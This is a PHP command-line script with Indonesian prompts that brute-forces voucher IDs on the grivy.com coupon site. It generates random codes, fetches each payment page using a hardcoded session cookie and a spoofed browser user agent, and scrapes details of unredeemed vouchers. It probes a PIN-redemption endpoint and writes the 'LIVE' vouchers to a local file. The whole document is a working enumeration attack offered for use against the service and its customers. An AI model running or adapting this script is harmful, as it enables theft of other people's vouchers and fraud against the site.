<?php
// @RiyanCoday - Caaya //
error_reporting(0);
function read ($length='255') 
{ 
   if (!isset ($GLOBALS['StdinPointer'])) 
   { 
      $GLOBALS['StdinPointer'] = fopen ("php://stdin","r"); 
   } 
   $line = fgets ($GLOBALS['StdinPointer'],$length); 
   return trim ($line); 
} 
function cdy($url, $post_fields = null) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    if ($post_fields && !empty($post_fields)) {
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $post_fields);
    }
	$headers = array();
	$headers[] = "accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8";
	$headers[] = "accept-language: en-US,en;q=0.9";
	$headers[] = "cache-control: max-age=0";
	$headers[] = "cookie: device=notmobile; PHPSESSID=mm7t2priiu70bei59fiq4jr0n5; __asc=b34d83b41675470beaace2fb6d7; __auc=b34d83b41675470beaace2fb6d7; _ga=GA1.2.655463955.1543309935; _gid=GA1.2.1704064773.1543309935; __utma=235343831.655463955.1543309935.1543309935.1543309935.1; __utmc=235343831; __utmz=235343831.1543309935.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); __utmt=1; _wingify_pc_uuid=e66b1872ac9d4ca8bbc8154ecb407001; wingify_donot_track_actions=0; picreel_tracker__first_visit=Tue%20Nov%2027%202018%2016%3A12%3A19%20GMT%2B0700%20(Western%20Indonesia%20Time); picreel_tracker__visited=1; __utmb=235343831.3.10.1543309935; picreel_tracker__page_views=3; wingify_push_do_not_show_notification_popup=true";
	$headers[] = "user-agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36";
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    $data = curl_exec($ch);
    if (curl_errno($ch)) {
        echo 'Error:' . curl_error($ch);
    }
    curl_close($ch);
    return $data;
}
function str($string,$start,$end){
	$str = explode($start,$string);
	$str = explode($end,$str[1]);
	return $str[0];
    }
echo "Mau Berapa Boss? ";
$bnyk = read();
echo "Tampilkan Lengkap ? 0=tidak 1=iya ";
$lengkap = read();
for ($x = 0; $x <= $bnyk-1; $x++){
$code = "2".rand(10000,99999);
	$url ="https://www.grivy.com/mobile/payment/index/sdeal/1/id/".$code;
$cdy = cdy($url);
//echo $cdy;
	    $voc = str($cdy, 'No. Kupon/Voucher: ','</div>');
		$titit = str($cdy, '<div class="title">
                <h1>','</h1>');
	    $exp = str($cdy, '<div class="date">
                        
						','                    </div>');
if (stripos($cdy, 'Swipe to Redeem')) {
		 $cid = str($cdy, 'name="cid" value="','"');
	$anti_tikung = cdy("https://www.grivy.com/mobile/cart/checkCertificatePinRedemption/","cid=".$cid."&pin=");
	if($lengkap == 1){
		echo 'LIVE => Vocuher: '.$voc.' | '.$titit.' | '.$exp.' | Anti Tikung: '.$anti_tikung.' ['.$code.'] ';
	}else{
		echo 'LIVE => Vocuher: '.$voc.' | Anti Tikung: '.$anti_tikung;
	}	
		$data =  'Vocuher: '.$voc.' | '.$titit.' | '.$exp.' | https://www.grivy.com/mobile/payment/index/sdeal/1/id/'.$code."\r\n";
		$fh = fopen("cdy.txt", "a");
		fwrite($fh, $data);
		fclose($fh);
		echo "\n";
	}elseif (stripos($cdy, '>Redeemed</a>')) {
		//echo 'USED => Vocuher:'.$voc.' | '.$titit.' | '.$exp;
	}elseif (!stripos($cdy, '<div class="title">')) {
		//echo 'DIE => ['.$code.']';
	}else{            
		echo 'Error Boss!';
}
}